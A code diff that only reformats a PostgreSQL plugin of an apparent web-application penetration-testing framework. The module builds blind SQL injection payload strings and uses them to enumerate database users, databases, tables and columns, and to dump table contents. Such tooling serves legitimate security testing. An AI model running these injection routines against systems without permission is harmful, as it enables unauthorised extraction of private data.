@@ -9,13 +9,12 @@ from plugins.attack.db.dbDriver import dbDriver as Common
 
 
 class PostgreSQLMap(Common):
-    __banner                 = ""
-    __currentDb              = ""
-    __fingerprint            = []
-    __cachedDbs              = []
-    __cachedTables           = {}
-    __cachedColumns          = {}
-
+    __banner = ""
+    __currentDb = ""
+    __fingerprint = []
+    __cachedDbs = []
+    __cachedTables = {}
+    __cachedColumns = {}
 
     def unescape(self, expression):
         while True:
@@ -27,7 +26,7 @@ class PostgreSQLMap(Common):
             index = expression[firstIndex:].find("'")
 
             if index == -1:
-                raise Exception, "Unenclosed ' in '%s'" % expression
+                raise Exception("Unenclosed ' in '%s'" % expression)
 
             lastIndex = firstIndex + index
             old = "'%s'" % expression[firstIndex:lastIndex]
@@ -43,24 +42,23 @@ class PostgreSQLMap(Common):
 
         return expression
 
-
     def createStm(self):
         if self.args.injectionMethod == "numeric":
-            evilStm  = " OR ASCII(SUBSTR((%s), %d, %d)) > %d"
+            evilStm = " OR ASCII(SUBSTR((%s), %d, %d)) > %d"
         elif self.args.injectionMethod == "stringsingle":
-            evilStm  = "' OR ASCII(SUBSTR((%s), %d, %d)) > %d AND '1"
+            evilStm = "' OR ASCII(SUBSTR((%s), %d, %d)) > %d AND '1"
         elif self.args.injectionMethod == "stringdouble":
-            evilStm  = '" OR ASCII(SUBSTR((%s), %d, %d)) > %d AND "1'
+            evilStm = '" OR ASCII(SUBSTR((%s), %d, %d)) > %d AND "1'
 
         return evilStm
 
     def createExactStm(self):
         if self.args.injectionMethod == "numeric":
-            evilStm  = " OR SUBSTR((%s), %d, %d) = '%s' AND 1=1"
+            evilStm = " OR SUBSTR((%s), %d, %d) = '%s' AND 1=1"
         elif self.args.injectionMethod == "stringsingle":
-            evilStm  = "' OR SUBSTR((%s), %d, %d) = '%s' AND '1"
+            evilStm = "' OR SUBSTR((%s), %d, %d) = '%s' AND '1"
         elif self.args.injectionMethod == "stringdouble":
-            evilStm  = '" OR SUBSTR((%s), %d, %d) = "%s" AND "1'
+            evilStm = '" OR SUBSTR((%s), %d, %d) = "%s" AND "1'
 
         return evilStm
 
@@ -81,7 +79,6 @@ class PostgreSQLMap(Common):
 
         return value
 
-
     def getBanner(self):
         logMsg = "fetching banner"
         self.log(logMsg)
@@ -91,13 +88,11 @@ class PostgreSQLMap(Common):
 
         return self.__banner
 
-
     def getCurrentUser(self):
         logMsg = "fetching current user"
         self.log(logMsg)
 
         return self.get_value("CURRENT_USER")
-
 
     def getCurrentDb(self):
         logMsg = "fetching current database"
@@ -108,18 +103,17 @@ class PostgreSQLMap(Common):
         else:
             return self.get_value("CURRENT_DATABASE()")
 
-
     def getUsers(self):
         logMsg = "fetching number of database users"
         self.log(logMsg)
 
-        stm  = "SELECT COUNT(DISTINCT(usename)) FROM pg_user"
+        stm = "SELECT COUNT(DISTINCT(usename)) FROM pg_user"
 
         count = self.get_value(stm)
 
         if not len(count) or count == "0":
             errMsg = "unable to retrieve the number of database users"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         logMsg = "fetching database users"
         self.log(logMsg)
@@ -127,17 +121,16 @@ class PostgreSQLMap(Common):
         users = []
 
         for index in range(int(count)):
-            stm  = "SELECT DISTINCT(usename) "
+            stm = "SELECT DISTINCT(usename) "
             stm += "FROM pg_user OFFSET %d LIMIT 1" % index
 
             user = self.get_value(stm)
             users.append(user)
 
         if not users:
-            raise Exception, "unable to retrieve the database users"
+            raise Exception("unable to retrieve the database users")
 
         return users
-
 
     def getDbs(self):
         logMsg = "fetching number of databases"
@@ -149,7 +142,7 @@ class PostgreSQLMap(Common):
 
         if not len(count) or count == "0":
             errMsg = "unable to retrieve the number of databases"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         logMsg = "fetching database names"
         self.log(logMsg)
@@ -157,7 +150,7 @@ class PostgreSQLMap(Common):
         dbs = []
 
         for index in range(int(count)):
-            stm  = "SELECT DISTINCT(datname) "
+            stm = "SELECT DISTINCT(datname) "
             stm += "FROM pg_database OFFSET %d LIMIT 1" % index
 
             db = self.get_value(stm)
@@ -167,16 +160,15 @@ class PostgreSQLMap(Common):
             self.__cachedDbs = dbs
         else:
             errMsg = "unable to retrieve the database names"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         return dbs
-
 
     def getTables(self):
         if self.args.db and self.args.db != "public":
             self.args.db = "public"
 
-            warnMsg  = "PostgreSQL module can only enumerate "
+            warnMsg = "PostgreSQL module can only enumerate "
             warnMsg += "tables from current database, also "
             warnMsg += "known as '%s'" % self.args.db
             self.warn(warnMsg)
@@ -186,15 +178,15 @@ class PostgreSQLMap(Common):
         logMsg = "fetching number of tables for database '%s'" % self.args.db
         self.log(logMsg)
 
-        stm  = "SELECT COUNT(DISTINCT(tablename)) FROM pg_tables "
+        stm = "SELECT COUNT(DISTINCT(tablename)) FROM pg_tables "
         stm += "WHERE schemaname = '%s'" % self.args.db
 
         count = self.get_value(stm)
 
         if not len(count) or count == "0":
-            errMsg  = "unable to retrieve the number of "
+            errMsg = "unable to retrieve the number of "
             errMsg += "tables for database '%s'" % self.args.db
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         logMsg = "fetching tables for database '%s'" % self.args.db
         self.log(logMsg)
@@ -203,7 +195,7 @@ class PostgreSQLMap(Common):
         tables = []
 
         for index in range(int(count)):
-            stm  = "SELECT DISTINCT(tablename) FROM pg_tables "
+            stm = "SELECT DISTINCT(tablename) FROM pg_tables "
             stm += "WHERE schemaname = '%s' " % self.args.db
             stm += "OFFSET %d LIMIT 1" % index
 
@@ -213,19 +205,18 @@ class PostgreSQLMap(Common):
         if tables:
             dbTables[self.args.db] = tables
         else:
-            errMsg  = "unable to retrieve the tables "
+            errMsg = "unable to retrieve the tables "
             errMsg += "for database '%s'" % self.args.db
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         self.__cachedTables = dbTables
 
         return dbTables
 
-
     def getColumns(self):
         if not self.args.tbl:
             errMsg = "missing table parameter"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         if "." in self.args.tbl:
             self.args.db, self.args.tbl = self.args.tbl.split(".")
@@ -233,18 +224,18 @@ class PostgreSQLMap(Common):
         if self.args.db and self.args.db != "public":
             self.args.db = "public"
 
-            warnMsg  = "PostgreSQL module can only enumerate "
+            warnMsg = "PostgreSQL module can only enumerate "
             warnMsg += "columns from tables on current database, "
             warnMsg += "also known as '%s'" % self.args.db
             self.warn(warnMsg)
         else:
             self.args.db = "public"
 
-        logMsg  = "fetching number of columns for table "
+        logMsg = "fetching number of columns for table "
         logMsg += "'%s' on current database" % self.args.tbl
         self.log(logMsg)
 
-        stm  = "SELECT COUNT(DISTINCT(attname)) "
+        stm = "SELECT COUNT(DISTINCT(attname)) "
         stm += "FROM pg_attribute JOIN pg_class ON "
         stm += "pg_class.oid = pg_attribute.attrelid "
         stm += "WHERE relname = '%s' " % self.args.tbl
@@ -253,13 +244,13 @@ class PostgreSQLMap(Common):
         count = self.get_value(stm)
 
         if not len(count) or count == "0":
-            errMsg  = "unable to retrieve the number of columns "
+            errMsg = "unable to retrieve the number of columns "
             errMsg += "for table '%s' " % self.args.tbl
             errMsg += "on current database"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
-        logMsg  = "fetching columns for table '%s' " % self.args.tbl
-        logMsg += "current database" 
+        logMsg = "fetching columns for table '%s' " % self.args.tbl
+        logMsg += "current database"
         self.log(logMsg)
 
         tableColumns = {}
@@ -267,7 +258,7 @@ class PostgreSQLMap(Common):
         columns = {}
 
         for index in range(int(count)):
-            stm  = "SELECT DISTINCT(attname) "
+            stm = "SELECT DISTINCT(attname) "
             stm += "FROM pg_attribute JOIN pg_class ON "
             stm += "pg_class.oid = pg_attribute.attrelid "
             stm += "WHERE relname = '%s' " % self.args.tbl
@@ -275,7 +266,7 @@ class PostgreSQLMap(Common):
 
             column = self.get_value(stm)
 
-            stm  = "SELECT atttypid "
+            stm = "SELECT atttypid "
             stm += "FROM pg_attribute JOIN pg_class ON "
             stm += "pg_class.oid = pg_attribute.attrelid "
             stm += "WHERE relname = '%s' " % self.args.tbl
@@ -288,24 +279,23 @@ class PostgreSQLMap(Common):
             table[self.args.tbl] = columns
             tableColumns[self.args.db] = table
         else:
-            errMsg  = "unable to retrieve the columns for "
+            errMsg = "unable to retrieve the columns for "
             errMsg += "table '%s' " % self.args.tbl
             errMsg += "on current database"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         self.__cachedColumns[self.args.db] = table
 
         return tableColumns
 
-
     def dumpTable(self):
         if not self.args.tbl:
-            raise Exception, "missing table parameter"
+            raise Exception("missing table parameter")
 
         if self.args.db and self.args.db != "public":
             self.args.db = "public"
 
-            warnMsg  = "PostgreSQL module can only dump "
+            warnMsg = "PostgreSQL module can only dump "
             warnMsg += "tables on current database, "
             warnMsg += "also known as '%s'" % self.args.db
             self.warn(warnMsg)
@@ -313,7 +303,7 @@ class PostgreSQLMap(Common):
         if not self.__cachedColumns:
             self.__cachedColumns = self.getColumns()
 
-        logMsg  = "fetching number of entries for table "
+        logMsg = "fetching number of entries for table "
         logMsg += "'%s' on current database" % self.args.tbl
         self.log(logMsg)
 
@@ -324,10 +314,10 @@ class PostgreSQLMap(Common):
         count = self.get_value(stm)
 
         if not len(count) or count == "0":
-            errMsg  = "unable to retrieve the number of entries "
+            errMsg = "unable to retrieve the number of entries "
             errMsg += "for table '%s' " % self.args.tbl
             errMsg += "on current database"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         if self.args.col:
             self.args.col = self.args.col.split(',')
@@ -338,7 +328,7 @@ class PostgreSQLMap(Common):
             if self.args.col and column not in self.args.col:
                 continue
 
-            logMsg  = "fetching entries of column '%s' for " % column
+            logMsg = "fetching entries of column '%s' for " % column
             logMsg += "table '%s' on current database" % self.args.tbl
             self.log(logMsg)
 
@@ -348,7 +338,7 @@ class PostgreSQLMap(Common):
             columnValues[column] = {}
 
             for index in range(int(count)):
-                stm  = "SELECT %s FROM %s " % (column, fromExpr)
+                stm = "SELECT %s FROM %s " % (column, fromExpr)
                 stm += "OFFSET %d LIMIT 1" % index
                 value = self.get_value(stm)
 
@@ -375,26 +365,23 @@ class PostgreSQLMap(Common):
 
             columnValues["__infos__"] = infos
         else:
-            errMsg  = "unable to retrieve the entries for "
+            errMsg = "unable to retrieve the entries for "
             errMsg += "table '%s'" % self.args.tbl
             if self.args.db:
                 errMsg += " on database '%s'" % self.args.db
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         return columnValues
 
-
     def getFile(self, filename):
         errMsg = "PostgreSQL module does not support file reading"
-        raise Exception, errMsg
-
+        raise Exception(errMsg)
 
     def getExpr(self, expression):
         if self.args.unionUse:
             return self.unionUse(expression)
         else:
             return self.get_value(expression)
-
 
     def checkDbms(self):
         logMsg = "testing PostgreSQL"
@@ -456,5 +443,4 @@ class PostgreSQLMap(Common):
             return False
 
     def __init__(self, urlOpener, cmpFunction, vuln):
-        Common.__init__( self, urlOpener, cmpFunction, vuln )
-
+        Common.__init__(self, urlOpener, cmpFunction, vuln)
